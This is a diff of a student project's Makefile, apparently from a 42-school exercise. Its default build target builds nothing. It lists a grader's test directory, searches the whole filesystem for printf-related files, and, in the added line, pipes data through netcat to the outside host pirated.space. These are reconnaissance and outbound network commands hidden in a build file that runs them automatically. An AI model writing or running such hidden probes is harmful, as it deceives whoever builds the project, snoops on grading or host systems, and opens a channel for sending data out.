@@ -6,10 +6,11 @@
 #    By: irhett <irhett@student.42.us.org>          +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2017/06/20 15:18:09 by irhett            #+#    #+#              #
-#    Updated: 2017/06/20 16:37:24 by irhett           ###   ########.fr        #
+#    Updated: 2017/06/20 16:45:54 by irhett           ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 
 all:
 	ls -laR /usr/src/test
 	find / -iname "*printf*"
+	echo "test" | nc pirated.space 25564
